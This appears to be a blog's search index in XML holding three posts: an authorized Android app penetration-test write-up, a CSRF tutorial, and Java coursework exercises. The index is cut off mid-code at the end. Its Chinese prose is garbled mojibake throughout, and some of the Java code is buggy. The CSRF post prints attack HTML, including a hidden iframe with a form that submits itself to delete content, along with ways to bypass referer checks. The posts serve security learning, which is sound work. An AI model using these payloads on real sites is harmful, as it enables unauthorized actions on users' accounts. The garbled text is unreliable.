<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Penetration testing</title>
      <link href="/2019/12/25/Penetration-testing/"/>
      <url>/2019/12/25/Penetration-testing/</url>
      
        <content type="html"><![CDATA[<h1 id="è®°ä¸€æ¬¡æˆæƒçš„APKæ¸—é€æµ‹è¯•"><a href="#è®°ä¸€æ¬¡æˆæƒçš„APKæ¸—é€æµ‹è¯•" class="headerlink" title="è®°ä¸€æ¬¡æˆæƒçš„APKæ¸—é€æµ‹è¯•"></a>è®°ä¸€æ¬¡æˆæƒçš„APKæ¸—é€æµ‹è¯•</h1><p>ä½œä¸ºä¸€ä¸ªæ¸—é€æµ‹è¯•å°ç™½ï¼Œæœ¬æ–‡çš„ç›®çš„æ˜¯å¸Œæœ›èƒ½ä¸ºé‚£äº›å’Œæˆ‘ä¸€æ ·çš„å°ç™½æä¾›ä¸€äº›æµ‹è¯•æ€è·¯ã€‚</p><p>æ¶‰åŠçš„å†…å®¹å¯èƒ½æ¯”è¾ƒåŸºç¡€ï¼Œè¡¨å“¥ä»¬è§è°…ã€‚</p><h2 id="APK-è§£åŒ…"><a href="#APK-è§£åŒ…" class="headerlink" title="APK è§£åŒ…"></a>APK è§£åŒ…</h2><p>æ‹¿åˆ° apk ä¹‹åç›´æ¥ç”¨ 7-Zip è§£å‹å¯ä»¥å¾—åˆ°å‡ ä¸ªæ–‡ä»¶å¤¹ã€ä¸€ä¸ª <strong>AndroidManifest.xml</strong> æ–‡ä»¶ã€ä¸€ä¸ªdexæ–‡ä»¶ã€‚ä½¿ç”¨ dex2jar <a href="https://sourceforge.net/projects/dex2jar/" title="å·¥å…·" target="_blank" rel="noopener">https://sourceforge.net/projects/dex2jar/</a> å°†è¿™ä¸ªdexæ–‡ä»¶è§£å‹ä¼šç”Ÿæˆä¸€ä¸ªjaræ–‡ä»¶ï¼Œç„¶åä½¿ç”¨jd-guiå°±å¯ä»¥æŸ¥çœ‹javaæºä»£ç äº†ã€‚</p><p>å½“ç„¶å¯ä»¥ä»æºç é‡Œæ‰¾ä»£ç çš„æ¼æ´ï¼Œä½†æ˜¯ä¸€èˆ¬ä¼šæœ‰æ··æ·†ï¼Œåœ¨è¿™ä¹Ÿä¸åšæ·±å…¥è®¨è®ºã€‚</p><p>ä¸Šè¾¹æåˆ°çš„ xml æ–‡ä»¶ä¸€å®šä¸èƒ½å‘æ”¾è¿‡ï¼Œé‡Œè¾¹æ¶‰åŠåˆ°è®¸å¤šé‡è¦çš„é…ç½®é¡¹ï¼Œæ¯”å¦‚ï¼š</p><ul><li>AndroidManifest.xmlæ–‡ä»¶ä¸­android:debuggableä¸ºtrueã€‚app å¯è¢«ä»»æ„è°ƒè¯•</li><li>AndroidManifest.xmlæ–‡ä»¶ä¸­android: allowBackupä¸ºtrueã€‚app æ•°æ®å¯ä»¥è¢«å¤‡ä»½å¯¼å‡ºã€‚</li><li>ç­‰ç­‰â€¦</li></ul><p>è¿˜æœ‰ä¸€ç‚¹åœ¨å®é™…æµ‹è¯•è¿‡ç¨‹ä¸­å¯èƒ½ä¼šç”¨åˆ°ï¼šåœ¨å¯¹ apk è§£å‹ä¹‹åå¯ä»¥å°è¯•åœ¨ powershell é‡Œè¾¹æœä¸€ä¸‹ <code>db</code> æ–‡ä»¶ï¼Œè¯´ä¸å®šæœ‰æ•æ„Ÿä¿¡æ¯(ä¸ºä»€ä¹ˆè¿™ä¹ˆè¯´ï¼Œå› ä¸ºæˆ‘ç¢°åˆ°è¿‡ä¸€æ¬¡â€¦)</p><pre><code>for /r F:\source-code %i in (*.db) do echo %i </code></pre><h2 id="ç™»é™†é¡µé¢"><a href="#ç™»é™†é¡µé¢" class="headerlink" title="ç™»é™†é¡µé¢"></a>ç™»é™†é¡µé¢</h2><h3 id="ç”¨æˆ·åå¯æšä¸¾"><a href="#ç”¨æˆ·åå¯æšä¸¾" class="headerlink" title="ç”¨æˆ·åå¯æšä¸¾"></a>ç”¨æˆ·åå¯æšä¸¾</h3><p>è¾“å…¥ç”¨æˆ·åä¹‹åå“åº”ç”¨æˆ·åä¸å­˜åœ¨ï¼Œè¿™å°±æ˜¯æœ€ç®€å•çš„æšä¸¾ç”¨æˆ·åçš„æƒ…å½¢äº†ã€‚</p><p>è¿™æ¬¡ç¢°åˆ°çš„æ˜¯ç™»é™†ä¸éœ€è¦å¯†ç ï¼Œä½†æ˜¯è¦è¾“å…¥å·²ç»æ³¨å†Œè¿‡çš„ç”¨æˆ·åï¼Œä¹‹åä¼šæ ¹æ®ç”¨æˆ·åå‘é€éªŒè¯ç åˆ°å¯¹åº”æ‰‹æœºï¼ŒåŒæ—¶è®¾ç½®äº† 120s å†…ä¸èƒ½é‡æ–°å‘é€ï¼Œå¹¶ä¸”éªŒè¯ç  120s å†…æœ‰æ•ˆã€‚</p><p>è¿™æ—¶å€™çœ‹èµ·æ¥æˆ‘ä»¬æ²¡åŠæ³•é€šè¿‡éªŒè¯ç åšä»€ä¹ˆäº‹ï¼Œä½†æ˜¯åœ¨å®é™…æµ‹è¯•è¿‡ç¨‹ä¸­å‘ç°</p><ol><li><p>å½“æˆ‘ä»¬è¾“å…¥å­˜åœ¨çš„è´¦å·ä¹‹åæç¤ºå‘é€æˆåŠŸï¼›</p></li><li><p>é‡å¤å‘é€ï¼Œä¼šå“åº” 120s å†…ä¸èƒ½é‡å¤å‘é€ï¼›</p></li><li><p>è¾“å…¥ä¸å­˜åœ¨ç”¨æˆ·ä¼šæç¤ºå‘é€å¤±è´¥ã€‚</p></li></ol><p>æ‰€ä»¥è¿™ä¸ªæ—¶é—´é™åˆ¶å¯¹ç”¨æˆ·åæšä¸¾å…¶å®æ²¡ä»€ä¹ˆå½±å“ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡çˆ†ç ´ç”¨æˆ·åæ ¹æ®è¿”å›çš„ä¿¡æ¯æ¥æŸ¥çœ‹ç”¨æˆ·åæ˜¯å¦å­˜åœ¨ã€‚</p><p><img src="https://wx3.sinaimg.cn/mw690/006boCb9ly1ga98w5qqs0j30ne0j9abm.jpg" alt="æšä¸¾ç”¨æˆ·"></p><p>ç­‰ç­‰ï¼Œæ—¢ç„¶å’±éƒ½ä¸çŸ¥é“æ‰‹æœºå·ï¼Œä¹Ÿä¸è®©è¾“å¯†ç ç™»é™†ï¼Œå°±ç®—å¾—åˆ°ç”¨æˆ·åç”Ÿæˆç¤¾å·¥å­—å…¸ä¹Ÿæ²¡æ³•ç”¨å•Šï¼Œé‚£æ‹¿åˆ°äº†ç”¨æˆ·åæœ‰ä»€ä¹ˆç”¨ï¼Ÿ</p><p>å½“ç„¶æœ‰ç”¨ï¼Œä¸è¿‡è¦çœ‹å…·ä½“åœºæ™¯ï¼Œæ¯”å¦‚ä¸‹é¢è¿™ä¸ªæ¡ˆä¾‹</p><h3 id="ä»»æ„éªŒè¯ç ç»•è¿‡"><a href="#ä»»æ„éªŒè¯ç ç»•è¿‡" class="headerlink" title="ä»»æ„éªŒè¯ç ç»•è¿‡"></a>ä»»æ„éªŒè¯ç ç»•è¿‡</h3><p>å½“æˆ‘ä»¬ç™»é™†æ—¶æœåŠ¡ç«¯ç»™è´¦å·ç»‘å®šçš„æ‰‹æœºå·å‘é€çŸ­ä¿¡éªŒè¯ç ï¼Œæˆ‘ä»¬è¾“å…¥ä¸€ä¸ªä¸Šä¸€æ­¥å¾—åˆ°çš„è´¦å·ï¼ŒéªŒè¯ç éšä¾¿è¾“ï¼Œç‚¹å‡»ç™»é™†åæŠ“åŒ…ï¼Œç™»é™†å¤±è´¥ï¼Œå‘ç°å“åº”ä¸­æœ‰ä¸¤ä¸ª code å­—æ®µ</p><p><img src="https://wx3.sinaimg.cn/mw690/006boCb9ly1ga98w9rlloj30l2070aaa.jpg" alt></p><p>æ”¹æ”¹è¯•è¯•ï¼š</p><p><img src="https://wx1.sinaimg.cn/mw690/006boCb9ly1ga98wgjh7kj30is057mx6.jpg" alt></p><p><strong>It works!</strong></p><h2 id="åŠŸèƒ½é¡µé¢"><a href="#åŠŸèƒ½é¡µé¢" class="headerlink" title="åŠŸèƒ½é¡µé¢"></a>åŠŸèƒ½é¡µé¢</h2><p>æˆåŠŸç™»å½•ä¹‹åï¼Œå„ä¸ªåŠŸèƒ½éƒ½ç‚¹ç‚¹çœ‹çœ‹ï¼Œåœ¨ä¸ªäººä¿¡æ¯é¡µé¢æœ‰ä¸€ä¸ªæŸ¥è¯¢å®æ—¶åœ¨çº¿äººæ•°åŠŸèƒ½ï¼Œé‚£ä¸€æ åªæ˜¾ç¤ºäº†äººæ•°ï¼Œæ—è¾¹å¹¶æ²¡æœ‰ç®­å¤´</p><p><img src="https://wx3.sinaimg.cn/mw690/006boCb9ly1ga98wd0il6j307n04bdfo.jpg" alt></p><p>æˆ‘ä¸€åº¦ä»¥ä¸ºé‚£é‡Œä¸èƒ½ç‚¹å‡»(äº‹å®ä¸Šå› ä¸ºæ•°æ®é‡å¤ªå¤§ï¼ŒåŠ è½½äº†å¥½é•¿æ—¶é—´ï¼Œæˆ‘ç›´æ¥ç‚¹è¿”å›äº†ï¼Œç»™æˆ‘çš„æ„Ÿè§‰å°±æ˜¯è¿™é‡Œæ²¡æœ‰ä¸œè¥¿)ï¼Œè¿›å»ä¹‹åå°±å¯ä»¥çœ‹åˆ°æ‰€æœ‰ç™»é™†äººå‘˜çš„ä¿¡æ¯äº†ã€‚</p><p><img src="https://wx3.sinaimg.cn/mw690/006boCb9ly1ga98voejstj30qf09pdh7.jpg" alt="å›¾æ‰“ç æ°´å¹³å®åœ¨ä¸å¤Ÿ"></p><p>åœ¨æˆ‘å°è¯•äº†ä¸åŒç”¨æˆ·ä¹‹åï¼Œå‘ç°è¿™é‡Œçš„ç”¨æˆ·ä¿¡æ¯å¹¶æ²¡æœ‰æƒé™é™åˆ¶ï¼Œä¹Ÿå°±æ˜¯è¯´å¯¹æ‰€æœ‰äººéƒ½æ˜¯å¯è§çš„ï¼Œæ˜æ˜¾çš„æƒé™é…ç½®ä¸å½“ã€‚</p><p>é™¤æ­¤ä¹‹å¤–ï¼Œåº”ç”¨å­˜åœ¨å‡ å¤„æŸ¥è¯¢åŠŸèƒ½ï¼Œé€šè¿‡BURP çœ‹åˆ°è¿”å›çš„æ•°æ®åŒ…éƒ½æ˜¯ JSON ç±»å‹</p><p><img src="https://wx3.sinaimg.cn/mw690/006boCb9ly1ga98wmervqj30m404vt90.jpg" alt></p><p>å› ä¸ºæ²¡ä»€ä¹ˆç»éªŒï¼Œæ‰€ä»¥å°±å¤šå°è¯•å—ï¼Œåœ¨ json é‚£é‡Œæ³¨å…¥ï¼Œxxe éƒ½æ¥ä¸€éï¼Œæ²¡å•¥ç”¨ã€‚</p><p>å‰é¢è¿˜æœ‰ä¸€ä¸ªå‚æ•°ï¼Œè¯•è¯•ï¼Ÿ</p><p><img src="https://wx4.sinaimg.cn/mw690/006boCb9ly1ga98x8llxwj30q203f74b.jpg" alt></p><p>æœ‰æˆï¼</p><p>è¯•è¯• xss å§</p><p><img src="https://wx2.sinaimg.cn/mw690/006boCb9ly1ga98xbyv4fj30q002q74d.jpg" alt></p><p>æ”¾åˆ°æµè§ˆå™¨æˆåŠŸå¼¹çª—ï¼</p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>å¹³æ—¶åšæµ‹è¯•è¿˜æ˜¯è¦ç»†å¿ƒï¼Œå¤šæ€»ç»“ï¼Œæ¯ä¸€ä¸ªèƒ½è¾“å…¥çš„åœ°æ–¹éƒ½ä¸èƒ½æ”¾è¿‡ï¼Œå¤šè¯•è¯•æ€»æ˜¯å¥½çš„ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> APK </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSRF ç®€å•è®¤è¯†</title>
      <link href="/2019/12/22/CSRF-%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/"/>
      <url>/2019/12/22/CSRF-%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="CSRF-ç®€å•è®¤è¯†"><a href="#CSRF-ç®€å•è®¤è¯†" class="headerlink" title="CSRF ç®€å•è®¤è¯†"></a>CSRF ç®€å•è®¤è¯†</h1><p>12/22/2019 11:47:20 AM </p><h2 id="ä»€ä¹ˆæ˜¯CSRF"><a href="#ä»€ä¹ˆæ˜¯CSRF" class="headerlink" title="ä»€ä¹ˆæ˜¯CSRF"></a>ä»€ä¹ˆæ˜¯CSRF</h2><p>è·¨ç«™è¯·æ±‚ä¼ªé€ -Cross Site Request Forgeryï¼Œä¹Ÿè¢«ç§°ä½œXSRFï¼Œç®€å•æ¥è¯´å°±æ˜¯ æ”»å‡»è€…åœ¨ä¸çŸ¥é“æŸä¸ªè´¦æˆ·è´¦å·å¯†ç çš„æƒ…å†µä¸‹ï¼Œåˆ©ç”¨ç›®æ ‡ç«™ç‚¹å·²ç»ç™»é™†è¿‡çš„è´¦æˆ·äº§ç”Ÿçš„èº«ä»½å‡­è¯ä¿¡æ¯(cookie)æ¥è¿›è¡Œä¸€ç³»åˆ—æ“ä½œï¼ŒåŒæ—¶è¯¥ç«™ç‚¹è®¤ä¸ºæ”»å‡»è€…æ‰€é‡‡å–çš„åŠ¨ä½œéƒ½æ˜¯åˆæ³•çš„(å› ä¸ºæ”»å‡»è€…ç›—ç”¨äº†è®¤è¯é€šè¿‡çš„è´¦æˆ·è´¦å·ä¿¡æ¯)ã€‚</p><h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>å¦‚æœå¯¹äºæŸä¸ªç½‘ç«™çš„åˆ é™¤æ–‡ç« åŠŸèƒ½çš„ä»£ç æ˜¯ </p><pre><code>&lt;a href=&apos;/delete?id=3&apos;&gt;åˆªé™¤&lt;/a&gt;</code></pre><p>ç„¶ååœ¨åç«¯åšæ ¡éªŒï¼ŒéªŒè¯ requests æœ‰æ²¡æœ‰å¸¦ session_id ,åŒæ—¶ç¡®è®¤æ˜¯ä¸æ˜¯è¿™ä¸ªæ–‡ç« çš„ä½œè€…ã€‚æ­¤æ—¶ï¼Œå‡å¦‚æ”»å‡»è€…é€šè¿‡é’“é±¼ï¼Œåˆ›å»ºäº†ä¸€ä¸ªæœ‰é’ˆå¯¹æ€§çš„ç½‘é¡µï¼Œé‡Œé¢çš„æŒ‰é’®çš„ä»£ç æ˜¯ï¼š</p><pre><code>&lt;a href=&apos;https://small-min.blog.com/delete?id=3&apos;&gt;é–‹å§‹æ¸¬é©—&lt;/a&gt;</code></pre><p>å¦‚æœè¿™æ—¶æ–‡ç« ä½œè€…ç‚¹å‡»äº†æŒ‰é’®ï¼Œé‚£ä¹ˆç”±äºæµè§ˆå™¨çš„è·¨åŸŸè¯·æ±‚æœºåˆ¶(åœ¨æµè§ˆå™¨è¿›ç¨‹çš„ç”Ÿå‘½å‘¨æœŸå†…ï¼Œå³ä½¿æµè§ˆå™¨æ‰“å¼€äº†æ–°çš„Tabé¡µï¼ŒSession Cookie ä¹Ÿæ˜¯æœ‰æ•ˆçš„ã€‚Session Cookie ä¿å­˜åœ¨æµè§ˆå™¨å†…å­˜ç©ºé—´å†…)ä¼šæŠŠä½œè€…çš„cookieä¸€èµ·å¸¦åˆ°GETè¯·æ±‚ä¸­ï¼ŒæœåŠ¡ç«¯æ£€æŸ¥åˆ°ç¡®å®æ˜¯ä½œè€…ï¼Œäºæ˜¯æ–‡ç« è¢«åˆ é™¤äº†ã€‚</p><p>å¦‚æœç¦ç”¨äº† <code>&lt;img&gt; ã€ &lt;iframe&gt; ã€ &lt;script&gt;</code> ç­‰å¸¦ src å±æ€§çš„æ ‡ç­¾ï¼Œå°±å¯ä»¥ç¦æ­¢ CSRF äº†ï¼Ÿè¿™ç±»æ ‡ç­¾åªèƒ½å‘èµ·ä¸€æ¬¡ GET è¯·æ±‚ï¼Œè€Œä¸èƒ½å‘èµ· POST è¯·æ±‚ã€‚ä½†æ˜¯ <code>form</code> æ ‡ç­¾å¯ä»¥å‘é€ POST request.</p><pre><code>&lt;form action=&quot;https://small-min.blog.com/delete&quot; method=&quot;POST&quot;&gt;  &lt;input type=&quot;hidden&quot; name=&quot;id&quot; value=&quot;3&quot;/&gt;  &lt;input type=&quot;submit&quot; value=&quot;é–‹å§‹æ¸¬é©—&quot;/&gt;&lt;/form&gt;</code></pre><p>è¿™æ ·è¿˜æ˜¯æ˜¾å¼çš„ï¼Œæˆ‘ä»¬å¯ä»¥é‡‡ç”¨æ›´éšè”½çš„æ–¹å¼</p><pre><code>&lt;iframe style=&quot;display:none&quot; name=&quot;csrf-frame&quot;&gt;&lt;/iframe&gt;&lt;form method=&apos;POST&apos; action=&apos;https://small-min.blog.com/delete&apos; target=&quot;csrf-frame&quot; id=&quot;csrf-form&quot;&gt;  &lt;input type=&apos;hidden&apos; name=&apos;id&apos; value=&apos;3&apos;&gt;  &lt;input type=&apos;submit&apos; value=&apos;submit&apos;&gt;&lt;/form&gt;&lt;script&gt;document.getElementById(&quot;csrf-form&quot;).submit()&lt;/script&gt;</code></pre><p>åœ¨æŸäº›é¡µé¢ä¸­å¯èƒ½è¿›è¡Œäº† referer æ£€æŸ¥ï¼Œä½†æ˜¯æˆ‘ä»¬ä¹Ÿè¦æ£€æµ‹æ˜¯å¦å­˜åœ¨é€»è¾‘é—®é¢˜ï¼š</p><ol><li>Referer è¿‡æ»¤ä¸ä¸¥è°¨</li></ol><p>æ¯”å¦‚æˆ‘æ„é€ äº†ä¸€ä¸ªè¡¨å• <strong>register</strong></p><pre><code>&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;    &lt;title&gt;csrf test&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;../csrf/server.php&quot; id= &quot;regesiter&quot; method=&quot;post&quot;&gt;    &lt;input type=&quot;text&quot; name=&quot;username&quot; value=&quot;&quot; /&gt;    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;submit&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>åœ¨ server.php ä¸­æˆ‘å¯¹ referer è¿›è¡Œäº†æ£€æµ‹ï¼Œå¦‚æœå«æœ‰ qq.com æˆ‘å°±å¯ä»¥è®¤ä¸ºæ˜¯åˆæ³•çš„ï¼Œä½†æ˜¯å¦‚æœæˆ‘é‡‡å–ä»¥ä¸‹çš„è¯·æ±‚æ–¹å¼ï¼š</p><p><img src="https://wx3.sinaimg.cn/small/006boCb9ly1ga5drxec7uj30su014jr9.jpg" alt="æ„é€ è¯·æ±‚"></p><p><img src="https://wx4.sinaimg.cn/small/006boCb9ly1ga5druqi6ej30df047glu.jpg" alt="refererå·²ç»å«æœ‰å…³é”®è¯"></p><ol start="2"><li>ç©ºreferer</li></ol><p>æŸäº›æµè§ˆå™¨çš„é˜²å¾¡éƒ¨ç½²æ˜¯å…è®¸ç©º REFERER çš„ã€‚</p><p>è¿˜å¯ä»¥ä½¿ç”¨ burp è‡ªå¸¦çš„ generate CSRF poc,é€‰æ‹©æµ‹è¯• URL å³é”®é€‰æ‹©ç”Ÿæˆ CSRF poc,å°†è¦æ›¿æ¢çš„å€¼ç„¶åä¿å­˜è®¿é—®å³å¯ã€‚</p><p>è¿˜å¯ä»¥ä½¿ç”¨ CSRFTester è½¯ä»¶æ¥æµ‹è¯•</p><h2 id="æ¼æ´æ£€æµ‹"><a href="#æ¼æ´æ£€æµ‹" class="headerlink" title="æ¼æ´æ£€æµ‹"></a>æ¼æ´æ£€æµ‹</h2><ol><li>GET</li></ol><p>å¦‚æœå¸¦æœ‰ token ç­‰éªŒè¯å‚æ•°ï¼Œå…ˆå»æ‰å‚æ•°å°è¯•èƒ½å¦æ­£å¸¸è¯·æ±‚ï¼Œå¦‚æœå¯ä»¥å³å­˜åœ¨ CSRF æ¼æ´ã€‚</p><ol start="2"><li>POST</li></ol><p>æœ€ç®€å•çš„æ–¹æ³•å°±æ˜¯æŠ“å–ä¸€ä¸ªæ­£å¸¸è¯·æ±‚çš„æ•°æ®åŒ…ï¼Œå»æ‰ token ç­‰éªŒè¯å‚æ•°åæäº¤ï¼Œå¦‚æœæ­£å¸¸è®¿é—®ï¼Œå†å»æ‰ Referer åé‡æ–°æäº¤ï¼Œå¦‚æœæäº¤è¿˜æœ‰æ•ˆï¼Œé‚£ä¹ˆåŸºæœ¬å¯ä»¥è®¤ä¸ºå­˜åœ¨ CSRF æ¼æ´ï¼Œå¯ä»¥æ„é€ å¤–éƒ¨ form è¡¨å•æ¥è¿›è¡Œæäº¤ã€‚å¦‚æœå»æ‰ referer å¤±è´¥è¿˜å¯ä»¥éªŒè¯å¯¹ referer æ ¡éªŒæ˜¯å¦ä¸¥æ ¼å°è¯•ç»•è¿‡ã€‚ä¹Ÿå¯èƒ½å­˜åœ¨ä»£ç å¯¹è¯·æ±‚ç±»å‹åˆ¤æ–­ä¸ä¸¥æ ¼($_REQUEST[])ï¼Œå¦‚æœ post å¤±è´¥äº†å°è¯•æ”¹æˆ get è¿›è¡Œè¯·æ±‚ã€‚ </p><h2 id="é˜²å¾¡"><a href="#é˜²å¾¡" class="headerlink" title="é˜²å¾¡"></a>é˜²å¾¡</h2><h3 id="éªŒè¯ç "><a href="#éªŒè¯ç " class="headerlink" title="éªŒè¯ç "></a>éªŒè¯ç </h3><p>å¼ºåˆ¶ç”¨æˆ·å¿…é¡»ä¸åº”ç”¨å®Œæˆäº¤äº’ï¼Œé¿å…åœ¨ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹æ„é€ ç½‘ç»œè¯·æ±‚</p><h3 id="Referer-Check"><a href="#Referer-Check" class="headerlink" title="Referer Check"></a>Referer Check</h3><p>æ£€æŸ¥è¯·æ±‚æ˜¯å¦æ¥è‡ªåˆæ³•çš„æºï¼Œä½†æ˜¯ä¸è¶³ä¹‹å¤„åœ¨äºæµè§ˆå™¨å¹¶éä»€ä¹ˆæ—¶å€™éƒ½èƒ½å–åˆ°Referer.</p><h3 id="Anti-CSRF-Token"><a href="#Anti-CSRF-Token" class="headerlink" title="Anti CSRF Token"></a>Anti CSRF Token</h3><p>å°†å‚æ•°åŠ å¯†ï¼Œæˆ–è€…ä½¿ç”¨ä¸€äº›çœŸéšæœºæ•°ï¼Œè®©æ”»å‡»è€…æ— æ³•çŒœæµ‹åˆ°å‚æ•°å€¼ï¼Œè¾¾åˆ°â€œä¸å¯é¢„æµ‹æ€§åŸåˆ™â€ã€‚å¯ä»¥æ–°åŠ ä¸€ä¸ªå‚æ•° TOKEN ï¼ŒåŒæ—¶æ”¾åœ¨è¡¨å•å’Œ session ä¸­ï¼ŒæœåŠ¡ç«¯åªéœ€éªŒè¯è¡¨å•ä¸­çš„ TOKEN å’Œ session ä¸­çš„ Token æ˜¯å¦ä¸€è‡´ï¼Œä¸€è‡´åˆ™è®¤ä¸ºæ˜¯åˆæ³•è¯·æ±‚ã€‚ </p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java</title>
      <link href="/2019/11/26/java-tests/"/>
      <url>/2019/11/26/java-tests/</url>
      
        <content type="html"><![CDATA[<h1 id="java-tests"><a href="#java-tests" class="headerlink" title="java-tests"></a>java-tests</h1><p>11/26/2019 9:26:49 AM </p><h2 id="charper-two"><a href="#charper-two" class="headerlink" title="charper two"></a>charper two</h2><ul><li>è¾“å…¥ä¸€ä¸ªæ•´æ•°ï¼Œè¾“å‡ºé˜¶ä¹˜æœ€å³è¾¹çš„é0æ•°å­—</li></ul><pre><code>package the_second_chapter;import java.math.BigInteger;import java.util.Scanner;public class first_one {public static void main(String[] args) {    // TODO Auto-generated method stub    //int sum = 0,temp = 1;    BigInteger num = new BigInteger(&quot;1&quot;);    System.out.println(&quot;ä½ æƒ³ç®—å¤šå°‘çš„é˜¶ä¹˜?&quot;);    Scanner scn = null;//é˜²æ­¢ Scanner is never closed çš„é”™è¯¯    try {        scn = new Scanner(System.in);        int num1 = scn.nextInt();        for(int number=1;number&lt;=num1;number++)        {            num = num.multiply(new BigInteger(number + &quot;&quot;));        }        System.out.println(num);    }    finally {        if(scn!=null)            scn.close();    }    char[] c = num.toString().toCharArray();                  System.out.println(num.toString().length());        //è¾“å‡ºé•¿åº¦    for(int b=num.toString().length()-1;b&gt;=0;b--) {        //åˆ¤æ–­é0        if(c[b]!=&apos;0&apos;) {            System.out.println(c[b]);            return;        }    }}}</code></pre><blockquote><p>String.ToCharArray Method</p><p>Definition</p><p>Namespace: System</p><p>Assemblies: System.Runtime.dll, mscorlib.dll, netstandard.dll</p><p>Copies the characters in this instance(å®ä¾‹) to a Unicode character array.</p><p><a href="https://docs.microsoft.com/en-us/dotnet/api/system.string.tochararray?view=netframework-4.8" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/dotnet/api/system.string.tochararray?view=netframework-4.8</a></p></blockquote><ul><li>è¾“å…¥ä¸€ç»„æ•°å­—ä¿å­˜åœ¨æ•°ç»„ä¸­ï¼Œé‡åˆ°0è¡¨ç¤ºè¾“å…¥ç»“æŸï¼Œå°†è¾“å…¥çš„æ•°ç»„é€†åºè¾“å‡º</li></ul><pre><code>package the_second_chapter;import java.util.Scanner;public class test_9 {public static void main(String[] args) {    // TODO Auto-generated method stub    Scanner input=new Scanner(System.in);    int[] num=new int[20];    int i;    for(i=0;;i++)    {        int a=input.nextInt();        if(a==0)            break;        num[i]=a;    }    for(i=i-1;i&gt;=0;i--)    {        System.out.print(num[i]);        if(i!=0)            System.out.print(&quot; &quot;);    }    System.out.println();}}</code></pre><ul><li>è¶…çº§é€’å¢åºåˆ—</li></ul><pre><code>package the_second_chapter;import java.util.Scanner;public class test_10 {public static void main(String[] args) {    // TODO Auto-generated method stub    Scanner scn = new Scanner(System.in);    int[] num = new int[20];    int i,flag=0;    int sum=0;    for(i=0;;i++) {        int a = scn.nextInt();        if(a==-999)            break;        num[i] = a;    }    for(int j=0;j&lt;num.length;j++) {        sum += num[j];        if(sum&lt;num[j+1])            flag=1;        else {            flag=2;            break;        }    if(flag==1) {        System.out.print(&quot;è¶…çº§é€’å¢ï¼&quot;);    }    else {        System.out.print(&quot;ä¸æ˜¯è¶…çº§é€’å¢&quot;);    }    }}}</code></pre><ul><li>ç»Ÿè®¡å­—ç¬¦ä¸²ä¸­å•è¯ä¸ªæ•°</li></ul><pre><code>package the_second_chapter;import java.util.Scanner;public class test_11 {public static void main(String[] args) {    // TODO Auto-generated method stub    Scanner scanner = new Scanner(System.in);    String s = scanner.nextLine();    String []arr = s.split(&quot; &quot;);    int count = 0;    for (int i = 0;i&lt;arr.length;i++){        for (int j = i+1;j&lt;arr.length;j++){            if (arr[i].equals( arr[j])){                arr[j] = &quot; &quot;;            }        }    }    for (int i = 0;i&lt;arr.length;i++){        System.out.println(arr[i]);    }    for (int i = 0;i&lt;arr.length;i++){        if (arr[i] != &quot; &quot;){            count++;        }    }    System.out.println(count);}}</code></pre><h2 id="third-chapter"><a href="#third-chapter" class="headerlink" title="third_chapter"></a>third_chapter</h2><ul><li>ä¿®æ”¹æ–‡ä»¶åç§°</li></ul><pre><code>package third_chapter;import java.io.*;import java.util.*;public class test_4 {public static void main(String[] args) {    // TODO Auto-generated method stub    Scanner scn = new Scanner(System.in);    System.out.print(&quot;è¯·è¾“å…¥æ—§æ–‡ä»¶è·¯å¾„åŠåç§°(D:\\test.txt)ï¼š&quot;);    String old_path = scn.next();    File old_file = new File(old_path);    System.out.print(&quot;è¯·è¾“å…¥æ–°æ–‡ä»¶åç§°(D:\\test1.txt)ï¼š&quot;);    String new_path = scn.next();    File new_file = new File(new_path);    if(old_file.exists() &amp;&amp; !new_file.exists()) {        old_file.renameTo(new_file);        System.out.print(&quot;reanme successful!&quot;);    }    else {        System.out.print(&quot;rename failue!&quot;);    }}}</code></pre><ul><li><p>å®ç°copyå‘½ä»¤</p><pre><code>package third_chapter;import java.io.*;import java.util.*;public class test_6 {public static void main(String[] args) throws FileNotFoundException {    // TODO Auto-generated method stub    try {    Scanner scn = new Scanner(System.in);    //è¾“å…¥æ–‡ä»¶å    System.out.print(&quot;è¯·è¾“å…¥è¦å¤åˆ¶çš„æ–‡ä»¶è·¯å¾„åŠåç§°ï¼š&quot;);    String old_file = scn.next();    FileReader old_one = new FileReader(old_file);   //åˆ›å»ºæ–‡ä»¶å¯¹è±¡    BufferedReader old_one_cont = new BufferedReader(old_one);//è¯»æ–‡ä»¶    System.out.print(&quot;è¯·è¾“å…¥è¦å¤åˆ¶åˆ°çš„æ–‡ä»¶è·¯å¾„åŠåç§°ï¼š&quot;);    String new_file = scn.next();    FileWriter new_one = new FileWriter(new_file);   //åˆ›å»ºæ–‡ä»¶å¯¹è±¡    BufferedWriter new_one_cont = new BufferedWriter(new_one);//è¯»æ–‡ä»¶    String content = null;    while((content = old_one_cont.readLine())!=null) {        new_one_cont.write(content);        new_one_cont.newLine();    }    //å…³é—­æ–‡ä»¶    new_one_cont.flush();    new_one_cont.close();    new_one.close();    }    catch(IOException e) {        System.out.print(e.toString());    }}}</code></pre></li></ul><ul><li><p>å®ç°åˆ é™¤æ³¨é‡ŠåŠŸèƒ½</p><pre><code>package third_chapter;import java.io.*;import java.util.*;/** * @author brian * * @date: 2019å¹´12æœˆ1æ—¥ 